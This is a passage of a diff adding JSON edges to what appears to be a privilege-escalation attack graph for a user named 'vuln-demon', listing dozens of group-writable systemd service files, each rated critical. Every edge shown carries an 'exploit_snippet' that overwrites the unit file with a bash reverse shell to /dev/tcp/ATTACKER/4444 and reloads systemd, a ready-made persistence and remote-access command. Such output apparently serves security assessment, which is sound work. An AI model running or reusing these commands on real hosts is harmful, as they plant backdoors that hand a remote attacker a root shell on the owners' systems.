+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e120",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-journal-flush.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e121",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-journald.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-journald.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-journald.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e122",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-machine-id-commit.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e123",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-modules-load.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-modules-load.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-modules-load.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e124",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-random-seed.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-random-seed.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-random-seed.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e125",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-sysctl.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-sysctl.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-sysctl.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e126",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-sysusers.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-sysusers.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e127",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-tmpfiles-setup-dev.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e128",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-tmpfiles-setup.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e129",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-udev-trigger.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e130",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-udevd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-udevd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-udevd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e131",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-update-utmp.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/sysinit.target.wants/systemd-update-utmp.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/sysinit.target.wants/systemd-update-utmp.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e132",
+      "source": "user:vuln-demon",
+      "target": "service:fwupd-offline-update.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/system-update.target.wants/fwupd-offline-update.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/system-update.target.wants/fwupd-offline-update.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e133",
+      "source": "user:vuln-demon",
+      "target": "service:packagekit-offline-update.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/system-update.target.wants/packagekit-offline-update.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/system-update.target.wants/packagekit-offline-update.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e134",
+      "source": "user:vuln-demon",
+      "target": "service:udev.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/udev.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/udev.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e135",
+      "source": "user:vuln-demon",
+      "target": "service:x11-common.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /lib/systemd/system/x11-common.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/lib/systemd/system/x11-common.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e136",
+      "source": "user:vuln-demon",
+      "target": "service:autovt@.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/autovt@.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/autovt@.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e137",
+      "source": "user:vuln-demon",
+      "target": "service:cryptdisks-early.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/cryptdisks-early.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/cryptdisks-early.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e138",
+      "source": "user:vuln-demon",
+      "target": "service:cryptdisks.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/cryptdisks.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/cryptdisks.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e139",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.hostname1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/dbus-org.freedesktop.hostname1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/dbus-org.freedesktop.hostname1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e140",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.locale1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/dbus-org.freedesktop.locale1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/dbus-org.freedesktop.locale1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e141",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.login1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/dbus-org.freedesktop.login1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/dbus-org.freedesktop.login1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e142",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.timedate1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/dbus-org.freedesktop.timedate1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/dbus-org.freedesktop.timedate1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e143",
+      "source": "user:vuln-demon",
+      "target": "service:getty-static.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/getty.target.wants/getty-static.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/getty.target.wants/getty-static.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e144",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-update-utmp-runlevel.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/graphical.target.wants/systemd-update-utmp-runlevel.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/graphical.target.wants/systemd-update-utmp-runlevel.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e145",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-halt.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/halt.target.wants/plymouth-halt.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/halt.target.wants/plymouth-halt.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e146",
+      "source": "user:vuln-demon",
+      "target": "service:hwclock.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/hwclock.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/hwclock.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e147",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-start.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/initrd-switch-root.target.wants/plymouth-start.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/initrd-switch-root.target.wants/plymouth-start.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e148",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-switch-root.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/initrd-switch-root.target.wants/plymouth-switch-root.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/initrd-switch-root.target.wants/plymouth-switch-root.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e149",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-kexec.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/kexec.target.wants/plymouth-kexec.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/kexec.target.wants/plymouth-kexec.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e150",
+      "source": "user:vuln-demon",
+      "target": "service:kmod.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/kmod.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/kmod.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e151",
+      "source": "user:vuln-demon",
+      "target": "service:lvm2.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/lvm2.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/lvm2.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e152",
+      "source": "user:vuln-demon",
+      "target": "service:dbus.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/multi-user.target.wants/dbus.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/dbus.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e153",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-quit-wait.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/multi-user.target.wants/plymouth-quit-wait.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/plymouth-quit-wait.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e154",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-quit.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/multi-user.target.wants/plymouth-quit.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/plymouth-quit.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e155",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-logind.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/multi-user.target.wants/systemd-logind.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/systemd-logind.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e156",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-update-utmp-runlevel.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/multi-user.target.wants/systemd-update-utmp-runlevel.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/systemd-update-utmp-runlevel.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e157",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-user-sessions.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/multi-user.target.wants/systemd-user-sessions.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/multi-user.target.wants/systemd-user-sessions.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e158",
+      "source": "user:vuln-demon",
+      "target": "service:multipath-tools-boot.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/multipath-tools-boot.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/multipath-tools-boot.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e159",
+      "source": "user:vuln-demon",
+      "target": "service:multipath-tools.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/multipath-tools.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/multipath-tools.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e160",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-log.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/plymouth-log.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/plymouth-log.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e161",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/plymouth.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/plymouth.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e162",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-poweroff.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/poweroff.target.wants/plymouth-poweroff.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/poweroff.target.wants/plymouth-poweroff.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e163",
+      "source": "user:vuln-demon",
+      "target": "service:procps.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/procps.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/procps.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e164",
+      "source": "user:vuln-demon",
+      "target": "service:rc.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/rc.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/rc.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e165",
+      "source": "user:vuln-demon",
+      "target": "service:rcS.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/rcS.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/rcS.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e166",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-reboot.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/reboot.target.wants/plymouth-reboot.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/reboot.target.wants/plymouth-reboot.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e167",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-update-utmp-runlevel.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/rescue.target.wants/systemd-update-utmp-runlevel.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/rescue.target.wants/systemd-update-utmp-runlevel.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e168",
+      "source": "user:vuln-demon",
+      "target": "service:screen-cleanup.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/screen-cleanup.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/screen-cleanup.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e169",
+      "source": "user:vuln-demon",
+      "target": "service:sudo.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sudo.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sudo.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e170",
+      "source": "user:vuln-demon",
+      "target": "service:kmod-static-nodes.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/kmod-static-nodes.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/kmod-static-nodes.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e171",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-read-write.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/plymouth-read-write.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/plymouth-read-write.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e172",
+      "source": "user:vuln-demon",
+      "target": "service:plymouth-start.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/plymouth-start.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/plymouth-start.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e173",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-binfmt.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-binfmt.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-binfmt.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e174",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-boot-system-token.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e175",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-hwdb-update.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e176",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-journal-flush.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /usr/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service \u0026\u0026 systemctl daemon-reload",
